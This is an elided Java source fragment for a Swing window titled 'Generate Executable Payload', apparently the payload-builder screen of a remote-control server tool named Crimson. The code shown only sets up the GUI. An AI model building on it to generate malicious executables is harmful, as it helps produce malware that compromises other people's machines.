...
import sl.SLPanel;
import sl.SLSide;
import subterranean.crimson.server.graphics.panels.generate.exe.Main;
import subterranean.crimson.universal.Platform;

public class GenerateEXE extends JFrame {
	...
	public GenerateEXE() {
		...
		if (!Platform.osx) {
			setIconImage(Toolkit.getDefaultToolkit().getImage(GenerateEXE.class.getResource("/subterranean/crimson/server/graphics/icons/menu/exe.png")));
		}
		setResizable(false);
		setTitle("Generate Executable Payload");
		...
		Notification notification = new Notification("Welcome to the Executable Generator!");
